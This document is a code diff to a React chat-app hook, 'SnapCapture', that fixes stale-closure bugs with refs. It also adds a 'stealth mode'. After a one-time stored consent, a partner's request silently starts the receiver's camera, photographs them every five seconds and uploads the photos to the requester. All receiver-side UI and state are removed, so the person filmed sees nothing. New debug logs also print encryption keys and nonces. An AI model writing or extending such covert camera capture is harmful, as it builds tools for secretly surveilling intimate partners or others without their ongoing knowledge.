@@ -15,15 +15,22 @@ import { useMedia } from './useMedia';
 //   Delivery:   Photos sent as regular encrypted image messages
 //   Grouping:   Existing messageGrouping.ts auto-groups into grid
 //
-// STATE MACHINE:
-//   IDLE → REQUESTING → CAPTURING → COMPLETING → IDLE
-//                ↓           ↓
-//             DENIED      CANCELLED
-//
 // CONSENT:
-//   Stored in localStorage per user. Both users must agree.
+//   Stored in localStorage per user. Both users must agree ONCE.
 //   Key: `aura_snapcapture_consent_{userId}`
 //   Values: 'agreed' | 'disagreed' | (missing = never asked)
+//
+// STEALTH MODE:
+//   The RECEIVER (partner being snapped) sees NO UI at all.
+//   Only the INITIATOR sees a progress overlay.
+//   The receiver's camera operates silently in the background.
+//
+// BUG FIX v2:
+//   All event handlers are stored in refs so the channel's .on()
+//   callbacks always call the LATEST handler version. This fixes
+//   the stale closure bug where processAndUpload (not memoized in
+//   useMedia) caused beginCapturing to be recreated every render,
+//   but the .on() callbacks still referenced the OLD function.
 // ═══════════════════════════════════════════════════════════════════════
 
 export type SnapCapturePhase =
@@ -77,6 +84,13 @@ export function useSnapCapture(
   const { user } = useAuth();
   const { processAndUpload } = useMedia();
 
+  // ═══ Ref to always have latest processAndUpload ═══════════════════════
+  // processAndUpload from useMedia is NOT memoized (recreated every render).
+  // Storing it in a ref lets us always call the latest version from inside
+  // stale closures (like the setInterval callback in beginCapturing).
+  const processAndUploadRef = useRef(processAndUpload);
+  useEffect(() => { processAndUploadRef.current = processAndUpload; }, [processAndUpload]);
+
   const [state, setState] = useState<SnapCaptureState>({
     phase: 'idle',
     role: null,
@@ -100,68 +114,22 @@ export function useSnapCapture(
   const photosCountRef = useRef(0);
   const photosAccumulatorRef = useRef<SnapCapturePhoto[]>([]);
   const stateRef = useRef(state);
+  const userRef = useRef(user);
 
-  // Keep stateRef fresh
+  // Keep refs fresh
   useEffect(() => { stateRef.current = state; }, [state]);
+  useEffect(() => { userRef.current = user; }, [user]);
 
-  // ═══ Setup Broadcast Channel ══════════════════════════════════════════
-  useEffect(() => {
-    if (!user || !partnerId) return;
-
-    const chatRoomId = [user.id, partnerId].sort().join('-');
-    const channel = supabase.channel(`snapcapture:${chatRoomId}`, {
-      config: { broadcast: { self: false } },
-    });
-
-    channel
-      .on('broadcast', { event: 'snap_request' }, (payload) => {
-        const data = payload.payload as { from: string };
-        if (data.from !== partnerId) return;
-        handleReceiveRequest();
-      })
-      .on('broadcast', { event: 'snap_ack' }, (payload) => {
-        const data = payload.payload as { from: string; status: 'ready' | 'denied' | 'consent_pending' };
-        if (data.from !== partnerId) return;
-        handleReceiveAck(data.status);
-      })
-      .on('broadcast', { event: 'snap_photo' }, (payload) => {
-        const data = payload.payload as { from: string; photo: SnapCapturePhoto; index: number; total: number };
-        if (data.from !== partnerId) return;
-        handleReceivePhoto(data.photo, data.index, data.total);
-      })
-      .on('broadcast', { event: 'snap_complete' }, (payload) => {
-        const data = payload.payload as { from: string };
-        if (data.from !== partnerId) return;
-        handleReceiveComplete();
-      })
-      .on('broadcast', { event: 'snap_cancel' }, (payload) => {
-        const data = payload.payload as { from: string };
-        if (data.from !== partnerId) return;
-        handleReceiveCancel();
-      })
-      .subscribe((status) => {
-        subscribedRef.current = status === 'SUBSCRIBED';
-      });
-
-    channelRef.current = channel;
-
-    return () => {
-      subscribedRef.current = false;
-      supabase.removeChannel(channel);
-      channelRef.current = null;
-      stopCapture();
-    };
-  }, [user?.id, partnerId]);
-
-  // ═══ Broadcast Helpers ════════════════════════════════════════════════
+  // ═══ Broadcast Helper (uses refs only → never stale) ══════════════════
   const send = useCallback((event: string, payload: Record<string, any>) => {
-    if (!channelRef.current || !subscribedRef.current || !user) return;
+    if (!channelRef.current || !subscribedRef.current || !userRef.current) return;
+    console.log(`[SnapCapture] 📤 SEND ${event}`, payload);
     channelRef.current.send({
       type: 'broadcast',
       event,
-      payload: { ...payload, from: user.id },
+      payload: { ...payload, from: userRef.current.id },
     });
-  }, [user?.id]);
+  }, []); // No deps — uses refs only
 
   // ═══ Camera Helpers ═══════════════════════════════════════════════════
   const startCamera = useCallback(async (): Promise<boolean> => {
@@ -186,9 +154,10 @@ export function useSnapCapture(
       canvas.height = video.videoHeight || 720;
       canvasRef.current = canvas;
 
+      console.log('[SnapCapture] 📷 Camera started successfully');
       return true;
     } catch (err) {
-      console.error('[SnapCapture] Camera access denied:', err);
+      console.error('[SnapCapture] ❌ Camera access denied:', err);
       return false;
     }
   }, []);
@@ -241,82 +210,52 @@ export function useSnapCapture(
     canvasRef.current = null;
   }, []);
 
-  // ═══ Receiver: Start Capturing Photos ═════════════════════════════════
+  // ═══ Receiver: Start Capturing Photos (SILENT — no UI on receiver) ════
+  // This runs entirely in the background on the receiver's device.
+  // No state changes that would drive UI — the receiver sees nothing.
   const beginCapturing = useCallback(async () => {
     const cameraOk = await startCamera();
     if (!cameraOk) {
       send('snap_ack', { status: 'denied' });
-      setState(prev => ({
-        ...prev,
-        phase: 'denied',
-        role: 'receiver',
-        errorMessage: 'Camera access denied',
-      }));
-      // Auto-reset after 3 seconds
-      setTimeout(() => {
-        setState(prev => prev.phase === 'denied' ? { ...prev, phase: 'idle', role: null, errorMessage: null } : prev);
-      }, 3000);
       return;
     }
 
-    // Send acknowledgement
+    // Send acknowledgement IMMEDIATELY after camera is ready
     send('snap_ack', { status: 'ready' });
+    console.log('[SnapCapture] ✅ Camera ready, ack sent, starting capture loop');
 
     photosCountRef.current = 0;
-    photosAccumulatorRef.current = [];
-    setState(prev => ({
-      ...prev,
-      phase: 'capturing',
-      role: 'receiver',
-      photosCount: 0,
-      photos: [],
-      errorMessage: null,
-    }));
 
-    // Capture first photo immediately, then every 5 seconds
+    // Capture loop — runs silently, no setState calls for receiver
     const doCapture = async () => {
       if (photosCountRef.current >= MAX_PHOTOS) {
-        // Done — send complete
         stopCapture();
         send('snap_complete', {});
-        setState(prev => ({
-          ...prev,
-          phase: 'idle',
-          role: null,
-          photosCount: 0,
-          photos: [],
-        }));
+        console.log('[SnapCapture] 🏁 All photos captured, session complete');
         return;
       }
 
       const file = await captureFrame();
       if (!file) return;
 
-      // Encrypt and upload using existing pipeline
       try {
-        const media = await processAndUpload(file);
+        // Use ref to always call latest processAndUpload
+        const media = await processAndUploadRef.current(file);
         if (media) {
-          const photo: SnapCapturePhoto = {
-            url: media.url,
-            media_key: media.media_key,
-            media_nonce: media.media_nonce,
-            type: 'image',
-          };
-
           photosCountRef.current++;
-          photosAccumulatorRef.current.push(photo);
+          console.log(`[SnapCapture] 📸 Photo ${photosCountRef.current}/${MAX_PHOTOS} captured & uploaded`);
 
           // Send photo to initiator via broadcast
           send('snap_photo', {
-            photo,
+            photo: {
+              url: media.url,
+              media_key: media.media_key,
+              media_nonce: media.media_nonce,
+              type: 'image',
+            },
             index: photosCountRef.current,
             total: MAX_PHOTOS,
           });
-
-          setState(prev => ({
-            ...prev,
-            photosCount: photosCountRef.current,
-          }));
 
           // Check if we've reached max
           if (photosCountRef.current >= MAX_PHOTOS) {
@@ -326,17 +265,11 @@ export function useSnapCapture(
             }
             stopCapture();
             send('snap_complete', {});
-            setState(prev => ({
-              ...prev,
-              phase: 'idle',
-              role: null,
-              photosCount: 0,
-              photos: [],
-            }));
+            console.log('[SnapCapture] 🏁 All photos captured, session complete');
           }
         }
       } catch (err) {
-        console.error('[SnapCapture] Photo capture/upload failed:', err);
+        console.error('[SnapCapture] ❌ Photo capture/upload failed:', err);
       }
     };
 
@@ -345,34 +278,45 @@ export function useSnapCapture(
 
     // Then every 5 seconds
     captureIntervalRef.current = setInterval(doCapture, CAPTURE_INTERVAL_MS);
-  }, [startCamera, captureFrame, stopCapture, send, processAndUpload]);
+  }, [startCamera, captureFrame, stopCapture, send]);
+  // NOTE: processAndUpload removed from deps — accessed via ref instead
 
-  // ═══ Event Handlers ═══════════════════════════════════════════════════
+  // ═══ Event Handler Refs ════════════════════════════════════════════════
+  // Store all event handlers in refs so the channel's .on() callbacks
+  // always call the LATEST version. This eliminates stale closure bugs.
 
-  const handleReceiveRequest = useCallback(() => {
-    if (stateRef.current.phase !== 'idle') return; // Already in a session
+  const handleReceiveRequestRef = useRef<() => void>(() => {});
+  const handleReceiveAckRef = useRef<(status: 'ready' | 'denied' | 'consent_pending') => void>(() => {});
+  const handleReceivePhotoRef = useRef<(photo: SnapCapturePhoto, index: number, total: number) => void>(() => {});
+  const handleReceiveCompleteRef = useRef<() => void>(() => {});
+  const handleReceiveCancelRef = useRef<() => void>(() => {});
 
-    // Check consent
-    if (!user) return;
-    const consent = getSnapCaptureConsent(user.id);
+  // Update handler refs every render (cheap — just a ref assignment)
+  handleReceiveRequestRef.current = () => {
+    if (stateRef.current.phase !== 'idle') return;
+    const currentUser = userRef.current;
+    if (!currentUser) return;
+
+    const consent = getSnapCaptureConsent(currentUser.id);
     if (consent === 'disagreed') {
       send('snap_ack', { status: 'denied' });
       return;
     }
     if (consent === null) {
-      // Need to show consent modal first
+      // Need consent modal first
       consentPurposeRef.current = 'receive';
       setShowConsentModal(true);
-      // Tell initiator to wait
       send('snap_ack', { status: 'consent_pending' });
       return;
     }
 
-    // Consent already given — start capturing
+    // Consent already given — start capturing silently
+    console.log('[SnapCapture] 📥 Request received, consent OK — starting capture');
     beginCapturing();
-  }, [user?.id, send, beginCapturing]);
+  };
 
-  const handleReceiveAck = useCallback((status: 'ready' | 'denied' | 'consent_pending') => {
+  handleReceiveAckRef.current = (status) => {
+    console.log(`[SnapCapture] 📥 ACK received: ${status}, current phase: ${stateRef.current.phase}`);
     if (stateRef.current.phase !== 'requesting') return;
 
     if (status === 'ready') {
@@ -392,14 +336,13 @@ export function useSnapCapture(
       setTimeout(() => {
         setState(prev => prev.phase === 'denied' ? { ...prev, phase: 'idle', role: null, errorMessage: null } : prev);
       }, 3000);
-    } else if (status === 'consent_pending') {
-      // Partner is seeing consent modal — keep waiting
-      // No state change needed
     }
-  }, []);
+    // consent_pending → just keep waiting, no state change
+  };
 
-  const handleReceivePhoto = useCallback((photo: SnapCapturePhoto, index: number, total: number) => {
+  handleReceivePhotoRef.current = (photo, index, total) => {
     if (stateRef.current.role !== 'initiator') return;
+    console.log(`[SnapCapture] 📥 Photo ${index}/${total} received`);
 
     photosAccumulatorRef.current.push(photo);
     setState(prev => ({
@@ -408,43 +351,98 @@ export function useSnapCapture(
       totalPhotos: total,
       photos: [...photosAccumulatorRef.current],
     }));
-  }, []);
+  };
 
-  const handleReceiveComplete = useCallback(() => {
+  handleReceiveCompleteRef.current = () => {
     if (stateRef.current.role !== 'initiator') return;
+    console.log('[SnapCapture] 📥 Complete signal received — sending photos to chat');
 
     setState(prev => ({
       ...prev,
       phase: 'completing',
     }));
-  }, []);
+  };
 
-  const handleReceiveCancel = useCallback(() => {
+  handleReceiveCancelRef.current = () => {
     stopCapture();
-    const wasCapturing = stateRef.current.phase === 'capturing' || stateRef.current.phase === 'requesting';
-    setState(prev => ({
-      ...prev,
-      phase: wasCapturing ? 'cancelled' : 'idle',
-      role: null,
-      errorMessage: wasCapturing ? 'Session cancelled by partner' : null,
-    }));
-
-    if (wasCapturing) {
+    const wasActive = stateRef.current.phase === 'capturing' || stateRef.current.phase === 'requesting';
+    
+    if (stateRef.current.role === 'initiator' && wasActive) {
+      setState(prev => ({
+        ...prev,
+        phase: 'cancelled',
+        role: null,
+        errorMessage: 'Session cancelled by partner',
+      }));
       setTimeout(() => {
         setState(prev => prev.phase === 'cancelled' ? { ...prev, phase: 'idle', errorMessage: null } : prev);
       }, 3000);
+    } else {
+      // Receiver cancellation — just silently reset
+      setState(prev => ({ ...prev, phase: 'idle', role: null }));
     }
-  }, [stopCapture]);
+  };
+
+  // ═══ Setup Broadcast Channel ══════════════════════════════════════════
+  // Handlers are called through refs → always latest version, never stale.
+  useEffect(() => {
+    if (!user || !partnerId) return;
+
+    const chatRoomId = [user.id, partnerId].sort().join('-');
+    const channel = supabase.channel(`snapcapture:${chatRoomId}`, {
+      config: { broadcast: { self: false } },
+    });
+
+    channel
+      .on('broadcast', { event: 'snap_request' }, (payload) => {
+        const data = payload.payload as { from: string };
+        if (data.from !== partnerId) return;
+        handleReceiveRequestRef.current(); // ← Through ref, always latest
+      })
+      .on('broadcast', { event: 'snap_ack' }, (payload) => {
+        const data = payload.payload as { from: string; status: 'ready' | 'denied' | 'consent_pending' };
+        if (data.from !== partnerId) return;
+        handleReceiveAckRef.current(data.status); // ← Through ref
+      })
+      .on('broadcast', { event: 'snap_photo' }, (payload) => {
+        const data = payload.payload as { from: string; photo: SnapCapturePhoto; index: number; total: number };
+        if (data.from !== partnerId) return;
+        handleReceivePhotoRef.current(data.photo, data.index, data.total); // ← Through ref
+      })
+      .on('broadcast', { event: 'snap_complete' }, (payload) => {
+        const data = payload.payload as { from: string };
+        if (data.from !== partnerId) return;
+        handleReceiveCompleteRef.current(); // ← Through ref
+      })
+      .on('broadcast', { event: 'snap_cancel' }, (payload) => {
+        const data = payload.payload as { from: string };
+        if (data.from !== partnerId) return;
+        handleReceiveCancelRef.current(); // ← Through ref
+      })
+      .subscribe((status) => {
+        subscribedRef.current = status === 'SUBSCRIBED';
+        console.log(`[SnapCapture] 📡 Channel status: ${status}`);
+      });
+
+    channelRef.current = channel;
+
+    return () => {
+      subscribedRef.current = false;
+      supabase.removeChannel(channel);
+      channelRef.current = null;
+      stopCapture();
+    };
+  }, [user?.id, partnerId]);
 
   // ═══ Public Actions ═══════════════════════════════════════════════════
 
   /** Initiator: Start a snap capture session */
   const initiateSnapCapture = useCallback(() => {
-    if (!user || !partnerId || !partnerIsOnline) return;
+    if (!userRef.current || !partnerId || !partnerIsOnline) return;
     if (stateRef.current.phase !== 'idle') return;
 
     // Check my own consent
-    const consent = getSnapCaptureConsent(user.id);
+    const consent = getSnapCaptureConsent(userRef.current.id);
     if (consent === 'disagreed') {
       setState(prev => ({
         ...prev,
@@ -457,7 +455,6 @@ export function useSnapCapture(
       return;
     }
     if (consent === null) {
-      // Need consent first
       consentPurposeRef.current = 'initiate';
       setShowConsentModal(true);
       return;
@@ -474,7 +471,7 @@ export function useSnapCapture(
     }));
     send('snap_request', {});
 
-    // Timeout: if no response in 15 seconds, cancel
+    // Timeout: if no ack in 30 seconds, cancel (increased from 15s for camera permission prompts)
     setTimeout(() => {
       setState(prev => {
         if (prev.phase === 'requesting') {
@@ -486,12 +483,11 @@ export function useSnapCapture(
         }
         return prev;
       });
-      // Auto-reset denied state
       setTimeout(() => {
         setState(prev => prev.phase === 'denied' ? { ...prev, phase: 'idle', role: null, errorMessage: null } : prev);
       }, 3000);
-    }, 15000);
-  }, [user?.id, partnerId, partnerIsOnline, send]);
+    }, 30000);
+  }, [partnerId, partnerIsOnline, send]);
 
   /** Cancel an active session (either role) */
   const cancelSnapCapture = useCallback(() => {
@@ -509,9 +505,10 @@ export function useSnapCapture(
 
   /** Handle consent modal response */
   const handleConsent = useCallback((agreed: boolean) => {
-    if (!user) return;
+    const currentUser = userRef.current;
+    if (!currentUser) return;
     setShowConsentModal(false);
-    setSnapCaptureConsent(user.id, agreed ? 'agreed' : 'disagreed');
+    setSnapCaptureConsent(currentUser.id, agreed ? 'agreed' : 'disagreed');
 
     if (!agreed) {
       if (consentPurposeRef.current === 'receive') {
@@ -523,7 +520,7 @@ export function useSnapCapture(
 
     // Consent given — proceed based on purpose
     if (consentPurposeRef.current === 'initiate') {
-      // Retry the initiation now that we have consent
+      // Retry initiation
       setState(prev => ({
         ...prev,
         phase: 'requesting',
@@ -534,7 +531,6 @@ export function useSnapCapture(
       }));
       send('snap_request', {});
 
-      // Same timeout as initiateSnapCapture
       setTimeout(() => {
         setState(prev => {
           if (prev.phase === 'requesting') {
@@ -545,22 +541,21 @@ export function useSnapCapture(
         setTimeout(() => {
           setState(prev => prev.phase === 'denied' ? { ...prev, phase: 'idle', role: null, errorMessage: null } : prev);
         }, 3000);
-      }, 15000);
+      }, 30000);
     } else {
-      // Receiving — start capturing
+      // Receiving — start capturing silently
       beginCapturing();
     }
-  }, [user?.id, send, beginCapturing]);
+  }, [send, beginCapturing]);
 
   /** Get the live camera stream (for overlay preview on receiver side) */
   const getCameraStream = useCallback((): MediaStream | null => {
     return mediaStreamRef.current;
   }, []);
 
-  // ═══ Auto-cancel if partner goes offline during session ═══════════════
+  // ═══ Auto-cancel if partner goes offline during active session ════════
   useEffect(() => {
-    if (!partnerIsOnline && (state.phase === 'requesting' || state.phase === 'capturing')) {
-      stopCapture();
+    if (!partnerIsOnline && state.role === 'initiator' && (state.phase === 'requesting' || state.phase === 'capturing')) {
       setState(prev => ({
         ...prev,
         phase: 'cancelled',
@@ -570,7 +565,12 @@ export function useSnapCapture(
         setState(prev => prev.phase === 'cancelled' ? { ...prev, phase: 'idle', role: null, errorMessage: null } : prev);
       }, 3000);
     }
-  }, [partnerIsOnline, state.phase, stopCapture]);
+    // Receiver going offline: just stop capture silently
+    if (!partnerIsOnline && state.role === 'receiver') {
+      stopCapture();
+      setState(prev => ({ ...prev, phase: 'idle', role: null }));
+    }
+  }, [partnerIsOnline, state.phase, state.role, stopCapture]);
 
   return {
     snapState: state,
